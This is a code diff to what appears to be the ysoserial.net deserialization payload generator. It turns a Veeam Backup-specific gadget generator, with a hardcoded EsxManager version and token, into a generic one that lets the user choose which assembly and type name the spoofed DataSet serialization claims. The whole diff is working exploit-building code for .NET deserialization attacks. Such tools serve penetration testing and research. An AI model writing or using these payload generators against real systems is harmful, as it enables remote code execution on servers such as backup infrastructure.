@@ -11,19 +11,19 @@ using ysoserial.Helpers;
 
 namespace ysoserial.Generators
 {
-    class VeeamXMLFrameworkDsGenerator : DataSetTypeSpoofGenerator
+    class DataSetTypeSpoofOverrideGenerator : DataSetTypeSpoofGenerator
     {
-        string veeamBackupEsxManagerVer = "12.1.0.0";
-        string veeamBackupEsxManagerToken = "bfd684de2276783a";
+        string assemblyName = "mscorlib";
+        string fullTypeName = "System.Data.DataSet, x=]";
         public override string Name()
         {
-            return "VeeamXMLFrameworkDs";
+            return "DataSetTypeSpoofOverride";
         }
 
         public override string AdditionalInfo()
         {
             return base.AdditionalInfo() + 
-                "\nThis version is for Veeam's xmlFrameworkDs, which simply modifies the assembly name and type name in GetObjectData method.";
+                "\nThis version adds options for overriding the assembly name and full type name in GetObjectData method.";
         }
 
         public override object Generate(string formatter, InputArgs inputArgs)
@@ -39,9 +39,9 @@ namespace ysoserial.Generators
             }
 
 
-            DataSetSpoofVeeamMarshal payloadDataSetMarshal = new DataSetSpoofVeeamMarshal(binaryFormatterPayload);
-            payloadDataSetMarshal.Ver = veeamBackupEsxManagerVer;
-            payloadDataSetMarshal.Token = veeamBackupEsxManagerToken;
+            DataSetSpoofOverrideMarshal payloadDataSetMarshal = new DataSetSpoofOverrideMarshal(binaryFormatterPayload);
+            payloadDataSetMarshal.AssemblyName = assemblyName;
+            payloadDataSetMarshal.FullTypeName = fullTypeName;
             if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                 || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
                 || formatter.Equals("soapformatter", StringComparison.OrdinalIgnoreCase))
@@ -58,28 +58,28 @@ namespace ysoserial.Generators
         {
             OptionSet options = new OptionSet()
             {
-                { "VeeamBackupEsxManagerVer=", "Version of Veeam.Backup.EsxManager assembly", v => veeamBackupEsxManagerVer = v },
-                { "VeeamBackupEsxManagerToken=", "PublicKeyToken of Veeam.Backup.EsxManager assembly", v => veeamBackupEsxManagerToken = v },
+                { "DataSetAssemblyName=", "Name of DataSet assembly", v => assemblyName = v.Replace(",", ", ") },
+                { "DataSetFullTypeName=", "Full type name of DataSet assembly", v => fullTypeName = v },
             };
             return options;
         }
     }
 
     [Serializable]
-    public class DataSetSpoofVeeamMarshal : DataSetSpoofMarshal
+    public class DataSetSpoofOverrideMarshal : DataSetSpoofMarshal
     {
-        public DataSetSpoofVeeamMarshal(byte[] bfPayload) : base(bfPayload)
+        public DataSetSpoofOverrideMarshal(byte[] bfPayload) : base(bfPayload)
         {
         }
 
-        public string Ver { get; set; }
-        public string Token { get; set; }
+        public string AssemblyName { get; set; }
+        public string FullTypeName { get; set; }
 
         public override void GetObjectData(SerializationInfo info, StreamingContext context)
         {
             base.GetObjectData(info, context);
-            info.AssemblyName = "Veeam.Backup.EsxManager, Version=" + Ver + ", Culture=neutral, PublicKeyToken=" + Token;
-            info.FullTypeName = "Veeam.Backup.EsxManager.xmlFrameworkDs";
+            info.AssemblyName = AssemblyName;
+            info.FullTypeName = FullTypeName;
         }
     }
 }
